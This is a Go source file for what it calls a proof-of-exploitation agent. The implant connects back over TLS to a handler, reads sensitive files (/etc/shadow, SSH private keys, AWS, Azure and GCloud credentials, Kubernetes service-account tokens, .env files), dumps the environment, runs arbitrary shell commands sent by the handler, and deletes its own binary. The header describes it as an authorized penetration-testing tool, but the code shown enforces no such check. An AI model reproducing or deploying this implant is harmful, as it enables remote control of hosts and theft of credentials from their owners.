// Package agent implements a lightweight proof-of-exploitation agent that can be
// dropped onto a target through a confirmed injection point. The agent collects
// evidence (environment, files, network, credentials, cloud metadata), provides
// reverse shell access, performs lateral movement, and self-destructs after a
// configurable timeout.
//
// The agent is designed to be compiled as a standalone binary and delivered via
// command injection, SSTI, XXE file write, or any other code execution vector.
// It connects back to a handler (beacon CLI or Forecast) over TLS.
//
// This is an authorized penetration testing tool. It requires explicit --authorized
// mode and proof of target ownership before deployment.
package agent

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"time"
)

// Config controls agent behavior.
type Config struct {
	// CallbackAddr is the host:port to connect back to (handler).
	CallbackAddr string `json:"callback_addr"`

	// TTL is how long the agent runs before self-destructing.
	// Zero means collect evidence and exit immediately (no persistence).
	TTL time.Duration `json:"ttl"`

	// Token identifies this agent session for the handler.
	Token string `json:"token"`

	// CollectEvidence enables automatic evidence collection on connect.
	CollectEvidence bool `json:"collect_evidence"`

	// EnableShell enables interactive reverse shell.
	EnableShell bool `json:"enable_shell"`

	// SelfDestruct removes the agent binary after execution.
	SelfDestruct bool `json:"self_destruct"`

	// TLSSkipVerify disables TLS certificate verification for the callback.
	TLSSkipVerify bool `json:"tls_skip_verify"`
}

// Evidence is the structured data collected from a target.
type Evidence struct {
	Timestamp   time.Time         `json:"timestamp"`
	Hostname    string            `json:"hostname"`
	OS          string            `json:"os"`
	Arch        string            `json:"arch"`
	User        string            `json:"user"`
	UID         string            `json:"uid"`
	Groups      []string          `json:"groups,omitempty"`
	PID         int               `json:"pid"`
	WorkingDir  string            `json:"working_dir"`
	Environment map[string]string `json:"environment"`
	Network     *NetworkInfo      `json:"network"`
	Files       []FileEvidence    `json:"files,omitempty"`
	CloudMeta   map[string]string `json:"cloud_metadata,omitempty"`
	Credentials []Credential      `json:"credentials,omitempty"`
}

// NetworkInfo describes the target's network configuration.
type NetworkInfo struct {
	Interfaces []NetInterface `json:"interfaces"`
	Listeners  []Listener     `json:"listeners,omitempty"`
	Routes     []string       `json:"routes,omitempty"`
	DNS        []string       `json:"dns,omitempty"`
	Hostname   string         `json:"hostname"`
}

// NetInterface is a single network interface.
type NetInterface struct {
	Name  string   `json:"name"`
	Addrs []string `json:"addrs"`
	MAC   string   `json:"mac,omitempty"`
	Flags string   `json:"flags,omitempty"`
}

// Listener is an open port on the target.
type Listener struct {
	Proto string `json:"proto"`
	Addr  string `json:"addr"`
}

// FileEvidence is a file read from the target.
type FileEvidence struct {
	Path    string `json:"path"`
	Content string `json:"content,omitempty"`
	Size    int64  `json:"size"`
	Error   string `json:"error,omitempty"`
}

// Credential is a discovered credential.
type Credential struct {
	Source   string `json:"source"`
	Type     string `json:"type"` // password, api_key, token, ssh_key, connection_string
	Username string `json:"username,omitempty"`
	Value    string `json:"value"`
}

// Message is the wire format between agent and handler.
type Message struct {
	Type    string          `json:"type"` // hello, evidence, shell_data, shell_resize, command, error, bye
	Token   string          `json:"token,omitempty"`
	Payload json.RawMessage `json:"payload,omitempty"`
}

// Agent is the running agent instance.
type Agent struct {
	config   Config
	conn     net.Conn
	encoder  *json.Encoder
	decoder  *json.Decoder
	mu       sync.Mutex
	evidence *Evidence
}

// New creates a new agent with the given config.
func New(cfg Config) *Agent {
	return &Agent{config: cfg}
}

// Run starts the agent. It connects to the handler, collects evidence,
// optionally provides a shell, and self-destructs after TTL.
func (a *Agent) Run(ctx context.Context) error {
	if a.config.SelfDestruct {
		defer a.selfDestruct()
	}

	// Apply TTL as a deadline.
	if a.config.TTL > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, a.config.TTL)
		defer cancel()
	}

	// Connect to handler.
	if err := a.connect(ctx); err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer a.conn.Close()

	// Send hello.
	if err := a.send(Message{Type: "hello", Token: a.config.Token}); err != nil {
		return fmt.Errorf("hello: %w", err)
	}

	// Collect and send evidence.
	if a.config.CollectEvidence {
		a.evidence = CollectEvidence(ctx)
		payload, _ := json.Marshal(a.evidence)
		if err := a.send(Message{Type: "evidence", Payload: payload}); err != nil {
			return fmt.Errorf("evidence: %w", err)
		}
	}

	// If shell is enabled, start the command loop.
	if a.config.EnableShell {
		return a.commandLoop(ctx)
	}

	// Otherwise send goodbye and exit.
	a.send(Message{Type: "bye"}) //nolint:errcheck
	return nil
}

// connect establishes a TLS connection to the handler.
func (a *Agent) connect(ctx context.Context) error {
	dialer := &net.Dialer{Timeout: 10 * time.Second}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: a.config.TLSSkipVerify, //nolint:gosec
	}

	conn, err := tls.DialWithDialer(dialer, "tcp", a.config.CallbackAddr, tlsConfig)
	if err != nil {
		return err
	}

	a.conn = conn
	a.encoder = json.NewEncoder(conn)
	a.decoder = json.NewDecoder(conn)
	return nil
}

// send writes a message to the handler.
func (a *Agent) send(msg Message) error {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.encoder.Encode(msg)
}

// commandLoop reads commands from the handler and executes them.
func (a *Agent) commandLoop(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			a.send(Message{Type: "bye"}) //nolint:errcheck
			return ctx.Err()
		default:
		}

		var msg Message
		if err := a.decoder.Decode(&msg); err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("decode: %w", err)
		}

		switch msg.Type {
		case "command":
			a.handleCommand(ctx, msg.Payload)
		case "shell_data":
			// Interactive shell data — handled by shell goroutine.
		case "bye":
			return nil
		}
	}
}

// CommandRequest is the payload for a "command" message.
type CommandRequest struct {
	Cmd     string        `json:"cmd"`
	Args    []string      `json:"args,omitempty"`
	Timeout time.Duration `json:"timeout,omitempty"`
}

// CommandResponse is the response to a command execution.
type CommandResponse struct {
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
	Error    string `json:"error,omitempty"`
}

// handleCommand executes a command and sends the result back.
func (a *Agent) handleCommand(ctx context.Context, payload json.RawMessage) {
	var req CommandRequest
	if err := json.Unmarshal(payload, &req); err != nil {
		a.sendError("invalid command: " + err.Error())
		return
	}

	timeout := req.Timeout
	if timeout == 0 {
		timeout = 30 * time.Second
	}
	cmdCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	shell, flag := shellCommand()
	fullCmd := req.Cmd
	if len(req.Args) > 0 {
		fullCmd = req.Cmd + " " + strings.Join(req.Args, " ")
	}

	cmd := exec.CommandContext(cmdCtx, shell, flag, fullCmd)
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	resp := CommandResponse{
		Stdout: stdout.String(),
		Stderr: stderr.String(),
	}
	if err != nil {
		resp.Error = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			resp.ExitCode = exitErr.ExitCode()
		} else {
			resp.ExitCode = -1
		}
	}

	respPayload, _ := json.Marshal(resp)
	a.send(Message{Type: "command_response", Payload: respPayload}) //nolint:errcheck
}

func (a *Agent) sendError(msg string) {
	payload, _ := json.Marshal(map[string]string{"error": msg})
	a.send(Message{Type: "error", Payload: payload}) //nolint:errcheck
}

// selfDestruct removes the agent binary from disk.
func (a *Agent) selfDestruct() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	os.Remove(exe) //nolint:errcheck
}

// shellCommand returns the appropriate shell and flag for the current OS.
func shellCommand() (string, string) {
	if runtime.GOOS == "windows" {
		return "cmd.exe", "/C"
	}
	// Try /bin/sh first (always available), fall back to /bin/bash.
	if _, err := os.Stat("/bin/bash"); err == nil {
		return "/bin/bash", "-c"
	}
	return "/bin/sh", "-c"
}

// CollectEvidence gathers all available evidence from the target system.
func CollectEvidence(ctx context.Context) *Evidence {
	ev := &Evidence{
		Timestamp:   time.Now().UTC(),
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		PID:         os.Getpid(),
		Environment: collectEnv(),
	}

	if h, err := os.Hostname(); err == nil {
		ev.Hostname = h
	}
	if wd, err := os.Getwd(); err == nil {
		ev.WorkingDir = wd
	}
	if u, err := user.Current(); err == nil {
		ev.User = u.Username
		ev.UID = u.Uid
		if gids, err := u.GroupIds(); err == nil {
			ev.Groups = gids
		}
	}

	ev.Network = collectNetwork()
	ev.Files = collectSensitiveFiles()
	ev.CloudMeta = collectCloudMetadata(ctx)
	ev.Credentials = extractCredentials(ev.Environment, ev.Files)

	return ev
}

// collectEnv returns all environment variables, redacting known-harmless ones.
func collectEnv() map[string]string {
	env := make(map[string]string)
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		}
		env[parts[0]] = parts[1]
	}
	return env
}

// collectNetwork gathers network interface information.
func collectNetwork() *NetworkInfo {
	info := &NetworkInfo{}

	if h, err := os.Hostname(); err == nil {
		info.Hostname = h
	}

	ifaces, err := net.Interfaces()
	if err != nil {
		return info
	}

	for _, iface := range ifaces {
		ni := NetInterface{
			Name:  iface.Name,
			MAC:   iface.HardwareAddr.String(),
			Flags: iface.Flags.String(),
		}
		addrs, err := iface.Addrs()
		if err == nil {
			for _, addr := range addrs {
				ni.Addrs = append(ni.Addrs, addr.String())
			}
		}
		if len(ni.Addrs) > 0 {
			info.Interfaces = append(info.Interfaces, ni)
		}
	}

	// Read DNS config.
	if data, err := os.ReadFile("/etc/resolv.conf"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "nameserver ") {
				info.DNS = append(info.DNS, strings.TrimPrefix(line, "nameserver "))
			}
		}
	}

	return info
}

// sensitiveFiles are paths to attempt reading for evidence collection.
var sensitiveFiles = []string{
	// Linux credentials + config
	"/etc/passwd",
	"/etc/shadow",
	"/etc/hosts",
	"/etc/crontab",

	// SSH
	"/root/.ssh/authorized_keys",
	"/root/.ssh/id_rsa",
	"/root/.ssh/id_ed25519",
	"/home/*/.ssh/authorized_keys",
	"/home/*/.ssh/id_rsa",

	// Application secrets
	"/proc/self/environ",
	"/proc/self/cmdline",
	".env",
	"../.env",
	"../../.env",

	// Kubernetes
	"/var/run/secrets/kubernetes.io/serviceaccount/token",
	"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
	"/var/run/secrets/kubernetes.io/serviceaccount/namespace",

	// Docker
	"/var/run/docker.sock",

	// Cloud provider credentials
	"/root/.aws/credentials",
	"/root/.aws/config",
	"/root/.azure/accessTokens.json",
	"/root/.config/gcloud/credentials.db",
	"/root/.config/gcloud/application_default_credentials.json",

	// Database configs
	"/etc/mysql/my.cnf",
	"/etc/postgresql/pg_hba.conf",
	"/var/lib/redis/dump.rdb",

	// Web server configs
	"/etc/nginx/nginx.conf",
	"/etc/apache2/apache2.conf",
	"/etc/httpd/conf/httpd.conf",
}

// collectSensitiveFiles reads sensitive files from the target.
func collectSensitiveFiles() []FileEvidence {
	var files []FileEvidence
	const maxFileSize = 64 * 1024 // 64KB per file

	for _, path := range sensitiveFiles {
		// Skip glob patterns for now (handle /home/*/ separately).
		if strings.Contains(path, "*") {
			continue
		}

		info, err := os.Stat(path)
		if err != nil {
			continue // file doesn't exist
		}

		fe := FileEvidence{
			Path: path,
			Size: info.Size(),
		}

		if info.Size() <= maxFileSize && info.Mode().IsRegular() {
			data, err := os.ReadFile(path)
			if err != nil {
				fe.Error = err.Error()
			} else {
				fe.Content = string(data)
			}
		} else if info.Size() > maxFileSize {
			fe.Error = "file too large, skipped"
		}

		files = append(files, fe)
	}

	return files
}
